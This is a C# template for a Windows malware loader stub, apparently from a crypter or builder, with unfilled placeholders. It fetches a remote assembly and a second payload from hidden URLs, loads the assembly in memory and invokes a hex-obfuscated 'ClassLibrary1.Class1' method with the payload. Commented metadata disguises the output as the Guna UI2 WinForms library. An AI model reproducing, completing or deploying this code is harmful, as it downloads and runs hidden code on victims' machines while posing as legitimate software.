using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Microsoft.VisualBasic.CompilerServices;


//Default [assembly: AssemblyTitle("Guna.UI2.dll")]
//Default [assembly: AssemblyDescription("Guna UI2 WinForms v2.0.0.6")]
//Default [assembly: AssemblyCompany("Sobatdata Software")]
//Default [assembly: AssemblyProduct("Guna UI2 WinForms")]
//Default [assembly: AssemblyCopyright("Copyright ©  2020")]
//Default [assembly: AssemblyFileVersion("2.0.0.6")]


//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]

namespace %1%
{
    static class Program
{
    /// <summary>
    /// The main entry point for the application.
    /// </summary>
    /// 





    [STAThread]
    private static void Main(string[] args)
    {


        System.Net.ServicePointManager.SecurityProtocol |=


        SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

        byte[] data = FromHex("");
        string s = Encoding.ASCII.GetString(data);



        var % 3 % = new WebClient().DownloadData(s);

        string Character = Regex.Replace("%ServerEncrypt%", "[^01]", "");

        byte[] ByteArrays = new byte[(int)Math.Round(unchecked((double)Character.Length / 8.0 - 1.0)) + 1];
        int num = 0;
        int num2 = ByteArrays.Length - 1;
        int Index = num;
        for (; ; )
        {
            int num3 = Index;
            int num4 = num2;
            if (num3 > num4)
            {
                break;
            }
            ByteArrays[Index] = Convert.ToByte(Character.Substring(Index * 8, 8), 2);
            Index++;
        }
        string Values = Encoding.ASCII.GetString(ByteArrays);
        string B = Values;


        var % 4 % = new WebClient().DownloadData(B);
     
        byte[] % 12 % = FromHex("43[^01]6C[^01]61[^01]73[^01]73[^01]4C[^01]69[^01]62[^01]72[^01]61[^01]72[^01]79[^01]31[^01]2E[^01]43[^01]6C[^01]61[^01]73[^01]73[^01]31");
     
        string % 13 % = Encoding.ASCII.GetString(% 12 %);

        byte[] r1 = FromHex("76[^01]65[^01]6C[^01]65[^01]74");
        string r2 = Encoding.ASCII.GetString(r1);

        string % 5 % = % 13 %;

        string % 6 % = r2;

        object % 7 % = new object[] { Application.ExecutablePath, string.Empty, % 4 %, true };


        var bro = BindingFlags.InvokeMethod;

        Assembly % 8 % = Assembly.Load(% 3 %);

        % 8 %.GetType(% 5 %).InvokeMember(% 6 %, bro, null, null, (object[])% 7 %);



    }

    public static byte[] FromHex(string hex)
    {
        hex = hex.Replace("[^01]", "");
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return raw;
    }
  }
}
